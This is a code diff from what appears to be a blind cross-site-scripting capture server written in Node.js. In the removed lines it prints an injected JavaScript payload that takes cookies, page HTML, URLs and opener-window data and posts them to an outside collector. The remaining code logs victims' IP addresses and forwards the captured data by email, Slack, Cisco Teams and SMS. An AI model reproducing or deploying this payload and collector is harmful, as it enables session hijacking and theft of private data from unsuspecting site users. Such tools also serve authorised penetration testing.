@@ -5,37 +5,14 @@ const save = require('../utilities/save');
 const uuid = require('uuid/v1');
 const config = require('../config/config');
 const slack = require('../utilities/slack');
+const ciscoTeams = require('../utilities/spark');
+const template = require('../utilities/template');
+const payloads = require('../utilities/payloads');
 
 exports.displayScript = (req, res) => {
   res.type('.js');
-  res.send(`
-  (function(){
-    if(window.name!=='__'){
-  
-              try {dcoo = document.cookie} catch(e) {dcoo=null}
-              try {inne = document.body.parentNode.innerHTML} catch(e) {inne=null}
-              try {durl = document.URL} catch(e) {durl=null}
-              try {oloc = opener.location} catch(e) {oloc=null}
-              try {oloh = opener.document.body.innerHTML} catch(e) {oloh=null}
-              try {odoc = opener.document.cookie} catch(e) {odoc=null}
-  
-              var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
-        var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
-              var body = document.getElementsByTagName('body')[0];
-  
-        __.setAttribute('value',escape(dcoo+'\\r\\n\\r\\n${config.boundary}'+inne+'\\r\\n\\r\\n${config.boundary}'+durl+'\\r\\n\\r\\n${config.boundary}'+oloc+'\\r\\n\\r\\n${config.boundary}'+oloh+'\\r\\n\\r\\n${config.boundary}'+odoc));
-        __.setAttribute('name','_');
-        _.appendChild(__);
-        _.action='//${config.url}/m';
-        _.method='post';
-              //_.target='_blank';
-  
-        body.appendChild(_);
-        window.name='__';
-        _.submit();
-        //history.back();
-    } else {window.name=''}
-  })();`);
+  const generatedTemplate = template.generateTemplate(config);
+  res.send(generatedTemplate);
 };
 
 exports.displayDefault = (req, res) => {
@@ -43,24 +20,31 @@ exports.displayDefault = (req, res) => {
   res.send('alert(1)');
 };
 
+exports.generatePayloads = (req, res) => {
+  res.set('Content-Type', 'text/plain');
+  const generatedPayloads = payloads.generatePayloads(config);
+  res.send(generatedPayloads);
+};
+
 exports.capture = (req, res) => {
   if (req.body._) {
-    const data = req.body._;
-    const rawDump = unescape(data);
-    const domain = process.processDomain(rawDump);
+    const rawDump = unescape(req.body._);
+    const domain = process.processDomain(rawDump, config);
     domain.victimIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
     const guid = uuid();
 
+
     // Always send email when resource is loaded
-    mail.sendMail(guid, domain);
+    mail.sendMail(guid, domain, config);
     // Always send to slack when resource is loaded;
-    slack.sendSlack(guid, domain);
+    slack.sendSlack(guid, domain, config);
+    ciscoTeams.sendCiso(guid, domain, config);
     // check if domain.URL exists or is not null/empty (should always be captured if valid request)
     if (!process.checkExists(domain) && !!domain.URL) {
       console.log(`${domain.URL} doesn't exist saving file`);
       if (!process.lastSave()) {
         console.log(`Sending SMS For URL ${domain.URL}`);
-        sms.sendSMS(guid, domain);
+        sms.sendSMS(guid, domain, config, save);
         console.log(`Saving To Disk URL ${domain.URL}`);
         save.saveFile(guid, domain);
         res.redirect(domain.URL);
